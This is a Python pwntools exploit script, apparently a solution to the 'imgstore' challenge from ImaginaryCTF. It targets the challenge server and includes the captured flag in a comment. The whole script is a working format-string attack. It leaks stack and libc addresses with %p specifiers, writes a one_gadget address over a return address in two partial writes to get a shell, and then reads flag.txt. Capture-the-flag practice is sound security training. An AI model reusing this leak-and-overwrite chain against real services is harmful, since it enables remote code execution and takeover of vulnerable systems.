#!/usr/bin/env python3

from pwn import *

#context.log_level = "debug"
elf = ELF("./imgstore_patched", checksec=False)
context.binary = elf

libc = ELF("./libc.so.6", checksec=False)

#p = elf.process()
#p = elf.debug(gdbscript="")
p = remote("imgstore.chal.imaginaryctf.org", 1337)

p.sendlineafter(b">> ", b"3")

p.sendlineafter(b"Enter book title: ", b"%p.%p.%25$p")

p.readuntil(b"--> ")

leaks = p.readline().decode().split(".")
stack_leak = int(leaks[0], 16) + 10040

libc_leak = int(leaks[2], 16)
libc.address = libc_leak - 0x0024083

# perform a partial rewrite of a libc return address in two stages
one_gadget = libc.address + 0xe3b01

p.sendlineafter(b"[y/n]: ", b"y") # first byte only
p.readuntil(b"Enter book title: ")
p.sendline(fmtstr_payload(8, {stack_leak: p8(one_gadget & 0xff)}))

p.sendlineafter(b"[y/n]: ", b"y") # bytes two and three next
p.readuntil(b"Enter book title: ")
p.sendline(fmtstr_payload(8, {stack_leak+1: p16(((one_gadget) >> 8) & 0xffff)}))

p.sendlineafter(b"[y/n]: ", b"n") # ret2one_gadget

p.sendline( b"/bin/cat flag.txt")
 
p.interactive() # ictf{b4byy_f3rM4T_5Tr1nn66S}
